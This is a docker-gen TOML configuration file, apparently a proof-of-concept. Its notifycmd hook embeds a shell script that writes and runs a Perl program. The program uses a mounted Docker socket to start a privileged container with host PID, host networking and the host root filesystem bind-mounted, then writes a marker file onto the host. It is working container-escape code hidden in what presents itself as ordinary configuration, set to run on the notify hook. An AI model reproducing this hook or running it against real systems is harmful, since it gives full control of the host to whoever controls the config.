[[config]]
template = "/tmp/pr-nginx.tmpl"
dest = "/tmp/pr-nginx-generated.conf"
onlyexposed = true
watch = false
notifycmd = '''sh -lc '
echo "OUTER_NOTIFY_STARTED" > /tmp/pr-dockergen-proof.txt
date >> /tmp/pr-dockergen-proof.txt
id >> /tmp/pr-dockergen-proof.txt
hostname >> /tmp/pr-dockergen-proof.txt

cat > /tmp/pr-docker-sock-escape.pl <<'"'"'PERL'"'"'
use strict;
use warnings;
use Socket;

$SIG{ALRM} = sub { die "global timeout\n" };
alarm 25;

my $sock_path = "/tmp/docker.sock";
my $proof = "/tmp/pr-dockergen-proof.txt";
my $name = "pr-host-escape-$$";
my $image = "nginxproxy/nginx-proxy:latest";

sub note {
    my ($text) = @_;
    open(my $fh, ">>", $proof) or die "open proof: $!";
    print $fh $text;
    close($fh);
}

sub json_string {
    my ($s) = @_;
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    return "\"" . $s . "\"";
}

sub read_available {
    my ($sock, $timeout) = @_;
    my $rin = "";
    vec($rin, fileno($sock), 1) = 1;
    my $rout = $rin;
    my $ready = select($rout, undef, undef, $timeout);
    return $ready && vec($rout, fileno($sock), 1);
}

sub docker_api {
    my ($method, $path, $body) = @_;
    $body //= "";

    socket(my $sock, AF_UNIX, SOCK_STREAM, 0) or die "socket: $!";
    connect($sock, sockaddr_un($sock_path)) or die "connect $sock_path: $!";

    my $request =
        "$method $path HTTP/1.1\r\n" .
        "Host: docker\r\n" .
        "User-Agent: pr-dockergen-lab\r\n" .
        "Connection: close\r\n";

    if ($method eq "POST" || $method eq "DELETE" || length($body)) {
        $request .=
            "Content-Type: application/json\r\n" .
            "Content-Length: " . length($body) . "\r\n";
    }

    $request .= "\r\n" . $body;

    my $offset = 0;
    while ($offset < length($request)) {
        my $written = syswrite($sock, substr($request, $offset));
        die "syswrite failed: $!" unless defined $written;
        $offset += $written;
    }

    my $response = "";

    while ($response !~ /\r?\n\r?\n/s) {
        die "timeout waiting for headers\n" unless read_available($sock, 2.0);
        my $buf = "";
        my $read = sysread($sock, $buf, 8192);
        die "read failed before headers: $!" unless defined $read;
        last if $read == 0;
        $response .= $buf;
    }

    my ($headers, $rest) = split(/\r?\n\r?\n/, $response, 2);
    $rest //= "";

    my $content_length = 0;
    if ($headers =~ /Content-Length:\s*(\d+)/i) {
        $content_length = int($1);
    }

    while (length($rest) < $content_length) {
        die "timeout waiting for body\n" unless read_available($sock, 2.0);
        my $buf = "";
        my $read = sysread($sock, $buf, 8192);
        die "read failed in body: $!" unless defined $read;
        last if $read == 0;
        $rest .= $buf;
    }

    close($sock);

    return $headers . "\r\n\r\n" . substr($rest, 0, $content_length);
}

sub status_code {
    my ($response) = @_;
    return $1 if $response =~ /^HTTP\/\S+\s+(\d+)/;
    return "unknown";
}

note("PERL_STARTED\n");

eval {
    my $ping = docker_api("GET", "/_ping", "");
    note("ping status: " . status_code($ping) . "\n");

    docker_api("DELETE", "/containers/$name?force=true", "");
    note("cleanup previous container: done\n");

    my $host_command =
        "echo 'you have been gnomed by the Niax' > /host/tmp/gnomed.txt";

    my $create_body =
        "{\"Image\":" . json_string($image) .
        ",\"Entrypoint\":[\"/bin/sh\",\"-lc\"]" .
        ",\"Cmd\":[" . json_string($host_command) . "]" .
        ",\"AttachStdout\":false" .
        ",\"AttachStderr\":false" .
        ",\"Tty\":false" .
        ",\"HostConfig\":{\"Privileged\":true,\"PidMode\":\"host\",\"NetworkMode\":\"host\",\"Binds\":[\"/:/host\"]}" .
        "}";

    my $create_response = docker_api("POST", "/containers/create?name=$name", $create_body);
    note("create status: " . status_code($create_response) . "\n");

    my ($container_id) = $create_response =~ /"Id"\s*:\s*"([^"]+)"/;

    if (!$container_id) {
        die "container create failed:\n$create_response\n";
    }

    note("created privileged helper container: $container_id\n");

    my $start_response = docker_api("POST", "/containers/$container_id/start", "");
    note("start status: " . status_code($start_response) . "\n");

    if ($start_response !~ /^HTTP\/\S+\s+204/m && $start_response !~ /^HTTP\/\S+\s+304/m) {
        die "container start failed:\n$start_response\n";
    }

    sleep 2;

    docker_api("DELETE", "/containers/$container_id?force=true", "");

    note("docker API via /tmp/docker.sock: OK\n");
    note("host proof path: /tmp/gnomed.txt\n");
};

if ($@) {
    note("docker API via /tmp/docker.sock: FAILED\n$@\n");
    exit 1;
}

alarm 0;
PERL

echo "PERL_FILE_WRITTEN" >> /tmp/pr-dockergen-proof.txt

perl -c /tmp/pr-docker-sock-escape.pl >/tmp/pr-perl-check.txt 2>&1 || {
  echo "PERL_SYNTAX_FAIL" >> /tmp/pr-dockergen-proof.txt
  cat /tmp/pr-perl-check.txt >> /tmp/pr-dockergen-proof.txt
  exit 1
}

echo "PERL_SYNTAX_OK" >> /tmp/pr-dockergen-proof.txt

perl /tmp/pr-docker-sock-escape.pl
' '''